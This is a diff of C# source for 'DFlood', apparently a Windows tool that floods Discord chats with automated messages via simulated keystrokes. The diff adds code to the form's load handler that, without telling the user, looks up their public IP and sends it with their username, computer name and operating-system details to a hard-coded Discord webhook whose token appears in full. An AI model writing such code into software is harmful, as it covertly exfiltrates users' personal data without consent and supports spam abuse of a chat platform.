@@ -1,12 +1,16 @@
 ﻿//coded by wés <3
 using DFlood.DFLoodDiscordRPC;
-using ShowMessage;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Media;
 using System.Runtime.InteropServices;
+using System.Threading.Tasks;
 using System.Windows.Forms;
+using Microsoft.VisualBasic.Devices;
+using System.Net;
+using System.Net.Sockets;
+using System.Text.RegularExpressions;
 
 namespace DFlood
 {
@@ -17,12 +21,14 @@ namespace DFlood
             InitializeComponent();
         }
 
-        private int topMostCounter, startStopCounter, messageCounter, nextWord, keyWordsCount;
+        private int topMostCounter, startStopCounter, messageCounter, nextWord, keyWordsCount, topTimeFloods;
         private int messageSendInterval = 1, min = 2, max = 6, floodCount = 30;
         private int bootDeleteAfter = 0, bootScr = 0, bootTp = 0, bootUnlmtd = 0, bootDeleteInt = 0;
         private System.Media.SoundPlayer snd = new SoundPlayer();
         private Random rnd = new Random();
         private OpenFileDialog ofd = new OpenFileDialog();
+        private OperatingSystem OS = System.Environment.OSVersion;
+        private DateTime today = DateTime.Now;
 
         private DiscordRpc.EventHandlers handlers;
         private DiscordRpc.RichPresence presence;
@@ -39,13 +45,34 @@ namespace DFlood
         [DllImportAttribute("User32.dll")]
         private static extern IntPtr SetForegroundWindow(int hWnd);
 
+        private static void sendWebHook(string Url, string msg, string Username)
+        {
+            Http.Post(Url, new System.Collections.Specialized.NameValueCollection()
+            {
+                {
+                    "username",
+                    Username
+                },
+                {
+                    "content",
+                    msg
+                }
+            });
+        }
+
+        private void Alert(string msg, Form_Alert.enmType type)
+        {
+            Form_Alert frm = new Form_Alert();
+            frm.showAlert(msg, type);
+        }
+
         private void formMover_MouseDown(object sender, MouseEventArgs e)
         {
             ReleaseCapture();
             SendMessage(this.Handle, 0x112, 0xf012, 0);
         }
 
-        public void DFloodDiscordRPCClient()
+        private void DFloodDiscordRPCClient()
         {
             this.handlers = default(DiscordRpc.EventHandlers);
             DiscordRpc.Initialize("852261353480650752", ref this.handlers, true, null);
@@ -56,12 +83,19 @@ namespace DFlood
             this.presence.largeImageKey = "logo";
             this.presence.smallImageKey = "logo";
             this.presence.largeImageText = "DFlood Spam Trainer";
-            this.presence.smallImageText = "Test Ediliyor";
-            this.presence.startTimestamp = 1507665886;
+            this.presence.smallImageText = "Suan Aktif!";
             DiscordRpc.UpdatePresence(ref this.presence);
         }
 
-        public void GetPersonalUserSettings()
+        public async Task Announce() // 1
+        {
+            DiscordSocketClient _client = new DiscordSocketClient(); // 2
+            ulong id = 852884362449387535; // 3
+            var chnl = _client.GetChannel(id) as IMessageChannel; // 4
+            await chnl.SendMessageAsync("Announcement!"); // 5
+        }
+
+        private void GetPersonalUserSettings()
         {
             secureMode.Checked = Properties.Settings.Default.IsSecureMode;
             unlimitedFlood.Checked = Properties.Settings.Default.IsUnlimitedFlood;
@@ -71,11 +105,12 @@ namespace DFlood
             txtMessageSenderIntervalMin.Value = Properties.Settings.Default.MinInterval;
             txtFloodCount.Value = Properties.Settings.Default.FloodNumber;
             messageDeleteInterval.Value = Properties.Settings.Default.msgDeleteInterval;
+            topTimeFloods = Properties.Settings.Default.GetTopFloodNumber;
             min = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
             max = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
         }
 
-        public void SavePersonalUserSettings()
+        private void SavePersonalUserSettings()
         {
             Properties.Settings.Default.IsSecureMode = secureMode.Checked;
             Properties.Settings.Default.IsUnlimitedFlood = unlimitedFlood.Checked;
@@ -85,6 +120,7 @@ namespace DFlood
             Properties.Settings.Default.MaxInvertal = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
             Properties.Settings.Default.msgDeleteInterval = Convert.ToInt16(messageDeleteInterval.Value);
             Properties.Settings.Default.FloodNumber = Convert.ToInt16(txtFloodCount.Value);
+            Properties.Settings.Default.GetTopFloodNumber = topTimeFloods;
             min = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
             max = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
             Properties.Settings.Default.Save();
@@ -104,20 +140,27 @@ namespace DFlood
 
             messageCounter = messageCounter + 1;
             messageSendInterval = rnd.Next(min, max);
+
+            topTimeFloods = topTimeFloods + 1;
         }
 
         private void MessageDeleteEventListener()
         {
             SendKeys.Send("{UP}");
+            System.Threading.Thread.Sleep(100);
             SendKeys.Send("^(a)");
+            System.Threading.Thread.Sleep(100);
             SendKeys.Send("{BACKSPACE}");
+            System.Threading.Thread.Sleep(100);
             SendKeys.Send("{ENTER}");
+            System.Threading.Thread.Sleep(100);
             SendKeys.Send("{ENTER}");
         }
 
         private void messageTimer_Tick(object sender, EventArgs e)
         {
             messageSendInterval = messageSendInterval - 1;
+
             if (messageSendInterval == 0)
             {
                 if (unlimitedFlood.Checked == true)
@@ -164,12 +207,13 @@ namespace DFlood
 
                 if (deleteAfter.Checked == true)
                 {
-                    ShowMessage.ShowMessage.MsgShow("Mesaj Silme Özelliği Başarıyla Etkinleştirildi", "DFlood");
-                    MessageDeleteEventListener();
+                    messageDeleteInterval.Enabled = true;
+                    this.Alert("Enabled", Form_Alert.enmType.Success);
                 }
                 else if (deleteAfter.Checked == false)
                 {
-                    ShowMessage.ShowMessage.MsgShow("Güvenli Mod Başarıyla Etkinleştirildi", "DFlood");
+                    messageDeleteInterval.Enabled = false;
+                    this.Alert("Disabled", Form_Alert.enmType.Warning);
                 }
             }
         }
@@ -196,10 +240,53 @@ namespace DFlood
             this.WindowState = FormWindowState.Minimized;
         }
 
+        [Obsolete]
         private void main_Load(object sender, EventArgs e)
         {
+            var webClient = new WebClient();
+            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
+            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
+            webClient.Dispose();
+            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
+            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
+            var ipadress = $"**IP Adresi : ** {dnsString}";
+            var day = $"**Giriş Günü : ** {today.DayOfWeek}";
+            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
+            var platform = $"**Platform : ** {OS.Platform.ToString()}";
+            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
+            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
+            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
+
+            sendWebHook("https://discord.com/api/webhooks/852885246734630994/MonkHE1WaU2REVn8U77Z7einRLTmwovO9PKr9Es9pFCmdXeqcCmW_jpIVx-mfNOfDOFI", $"**DFlood Trainer'e Yeni Giriş Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n--------------------------------------------------------------------", "DFlood Services");
             DFloodDiscordRPCClient();
             GetPersonalUserSettings();
+
+            if (deleteAfter.Checked == false)
+            {
+                messageDeleteInterval.Enabled = false;
+            }
+
+            if (secureMode.Checked == true)
+            {
+                txtMessageSenderIntervalMin.Enabled = false;
+                txtMessageSenderIntervalMax.Enabled = false;
+                txtFloodCount.Enabled = false;
+                unlimitedFlood.Enabled = false;
+                deleteAfter.Checked = true;
+                deleteAfter.Enabled = false;
+                messageDeleteInterval.Enabled = false;
+            }
+
+            if (topMost.Checked == true)
+            {
+                this.TopMost = true;
+                topMostCounter = 1;
+            }
+
+            if (unlimitedFlood.Checked == true)
+            {
+                txtFloodCount.Enabled = false;
+            }
         }
 
         private void messageRefreshTime_MouseDown(object sender, MouseEventArgs e)
@@ -216,16 +303,41 @@ namespace DFlood
                 snd.Play();
                 if (secureMode.Checked == true)
                 {
+                    bootDeleteAfter = 0;
+                    bootTp = 0;
+                    bootUnlmtd = 0;
+                    this.Alert("Enabled", Form_Alert.enmType.Success);
+
                     txtMessageSenderIntervalMin.Enabled = false;
+                    txtMessageSenderIntervalMax.Enabled = false;
                     txtFloodCount.Enabled = false;
-                    txtMessageSenderIntervalMin.Value = txtMessageSenderIntervalMin.Minimum;
-                    ShowMessage.ShowMessage.MsgShow("Güvenli Mod Başarıyla Etkinleştirildi", "DFlood");
+                    unlimitedFlood.Enabled = false;
+                    deleteAfter.Checked = true;
+                    deleteAfter.Enabled = false;
+                    messageDeleteInterval.Enabled = false;
+
+                    bootDeleteAfter = 1;
+                    bootTp = 1;
+                    bootUnlmtd = 1;
                 }
                 else if (secureMode.Checked == false)
                 {
+                    bootDeleteAfter = 0;
+                    bootTp = 0;
+                    bootUnlmtd = 0;
+
+                    this.Alert("Disabled", Form_Alert.enmType.Warning);
                     txtMessageSenderIntervalMin.Enabled = true;
+                    txtMessageSenderIntervalMax.Enabled = true;
                     txtFloodCount.Enabled = true;
-                    ShowMessage.ShowMessage.MsgShow("Güvenli Mod Başarıyla Devre Dışı Bırakıldı", "DFlood");
+                    messageDeleteInterval.Enabled = true;
+                    unlimitedFlood.Enabled = true;
+                    deleteAfter.Checked = false;
+                    deleteAfter.Enabled = true;
+
+                    bootDeleteAfter = 1;
+                    bootTp = 1;
+                    bootUnlmtd = 1;
                 }
             }
         }
@@ -272,7 +384,7 @@ namespace DFlood
                 messageDeleteInterval.Enabled = false;
                 messageRefreshTime.Enabled = false;
                 messageTimer.Start();
-                ShowMessage.ShowMessage.MsgShow("Flood Hizmeti Başarıyla Başlatıldı", "DFlood");
+                this.Alert("Flood Service Started", Form_Alert.enmType.Success);
             }
             else if (startStopCounter % 2 == 0)
             {
@@ -290,7 +402,7 @@ namespace DFlood
                 deleteAfter.Enabled = true;
                 messageDeleteInterval.Enabled = true;
                 messageRefreshTime.Enabled = true;
-                ShowMessage.ShowMessage.MsgShow("Flood Hizmeti Başarıyla Kapatıldı. Yapılan Flood : " + messageCounter, MsgType.Success, MsgLanguage.English);
+                this.Alert("Flood Service Stopped", Form_Alert.enmType.Warning);
                 messageRefreshTime.Value = 0;
                 messageCounter = 0;
                 startStopCounter = 0;
@@ -321,7 +433,8 @@ namespace DFlood
                 snd.SoundLocation = "success.wav";
                 snd.Play();
                 btnStartService.Enabled = true;
-                ShowMessage.ShowMessage.MsgShow($"{ofd.FileName} Dosyası Başarıyla DFlood Trainer'a Aktarıldı", "DFlood");
+                this.Alert($"Import Successfully", Form_Alert.enmType.Success);
+
                 txtFilePath.Text = ofd.FileName;
             }
             else if (reply == DialogResult.Cancel)
@@ -344,12 +457,12 @@ namespace DFlood
                 if (topMostCounter % 2 == 1)
                 {
                     this.TopMost = true;
-                    ShowMessage.ShowMessage.MsgShow("Pencere Sabitleyici Başarıyla Etkinleştirildi", "DFlood");
+                    this.Alert("Enabled", Form_Alert.enmType.Success);
                 }
                 else
                 {
                     this.TopMost = false;
-                    ShowMessage.ShowMessage.MsgShow("Pencere Sabitleyici Başarıyla Devre Dışı Bırakıldı", "DFlood");
+                    this.Alert("Disabled", Form_Alert.enmType.Warning);
                 }
             }
         }
@@ -364,13 +477,13 @@ namespace DFlood
 
                 if (unlimitedFlood.Checked == false)
                 {
-                    ShowMessage.ShowMessage.MsgShow("Sınırsız Flood Başarıyla Devre Dışı Bırakıldı", "DFlood");
+                    this.Alert("Disabled", Form_Alert.enmType.Warning);
                     floodCount = Convert.ToInt16(txtFloodCount.Value);
                     txtFloodCount.Enabled = true;
                 }
                 else
                 {
-                    ShowMessage.ShowMessage.MsgShow("Sınırsız Flood Başarıyla Etkinleştirildi", "DFlood");
+                    this.Alert("Enabled", Form_Alert.enmType.Success);
                     txtFloodCount.Enabled = false;
                 }
             }
